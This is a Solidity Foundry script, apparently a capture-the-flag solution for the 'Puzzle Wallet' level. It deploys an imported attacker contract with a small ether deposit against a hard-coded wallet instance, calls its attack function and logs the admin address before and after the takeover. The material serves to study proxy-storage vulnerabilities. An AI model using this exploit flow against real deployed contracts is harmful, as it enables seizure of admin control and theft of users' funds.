// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {Puzzled} from "../src/24_PuzzleWallet.sol";

interface IPuzzled {
    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function multicall(bytes[] calldata data) external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function setMaxBalance(uint256 _maxBalance) external;
}

interface IPuzzleWallet {
    function admin() external view returns (address);
}

contract PoC is Script {
    address private immutable puzzleWallet =
        0xB8759fFB6d451D0a9C9404d1cB0D1B8D75e4F5b0; // Replace with your PuzzleWallet instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        console2.log("Current admin: ", IPuzzleWallet(puzzleWallet).admin());

        Puzzled puzzled = new Puzzled{value: 0.001 ether}(puzzleWallet);
        puzzled.attack();

        console2.log("New admin: ", IPuzzleWallet(puzzleWallet).admin());

        vm.stopBroadcast();
    }
}
